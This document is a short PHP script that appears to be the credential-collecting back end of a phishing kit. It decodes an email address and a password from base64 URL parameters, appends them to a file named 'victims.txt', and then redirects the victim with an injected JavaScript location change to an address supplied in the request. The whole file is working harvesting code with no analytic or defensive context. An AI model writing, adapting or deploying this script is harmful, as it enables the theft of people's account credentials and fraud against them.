<?php
if ($_GET){
    $email = base64_decode($_GET["id"]);
    $pwd = base64_decode($_GET["locid"]);
    $ech = '<script>window.location = "'.base64_decode($_GET['r']).'";</script>';
    $f = fopen("victims.txt",'a+');
    fwrite($f,$email."<!:!>".$pwd."\n");
    fclose($f);
    echo $ech;
}
?>
